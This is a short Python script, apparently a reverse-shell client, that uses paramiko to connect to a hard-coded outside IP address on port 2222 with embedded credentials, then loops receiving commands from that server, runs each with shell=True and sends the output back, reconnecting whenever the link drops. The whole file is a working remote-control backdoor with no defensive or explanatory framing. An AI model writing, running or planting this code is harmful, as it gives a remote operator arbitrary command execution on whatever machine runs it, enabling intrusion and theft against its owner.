#!/usr/bin/python3
import paramiko
import subprocess

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
def connect():
    try:
        ssh.connect("52.233.155.65", 2222, "zanda", "password123", timeout=10)
    except:
        connect()
    print("Connected")
    client_session = ssh.get_transport().open_session()
    print("Connected to server")
    if client_session.active and not client_session.closed:
        #wait for command, execute and send result ouput
        while True:
            #use subprocess run with timeout of 30 seconds
            try:
                command = client_session.recv(1024).decode('utf-8')
                command_output = subprocess.run(
                    command, stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    shell=True,
                    timeout=30
                )
                #send back the resulting output
                if len(command_output.stderr.decode('utf-8')):
                    client_session.send(command_output.stderr.decode('utf-8'))
                elif len(command_output.stdout.decode('utf-8')):
                    client_session.send(command_output.stdout.decode('utf-8'))
                else:
                    client_session.send('null')
            except:
                client_session.close()
                connect()
    else:
        connect()
connect()
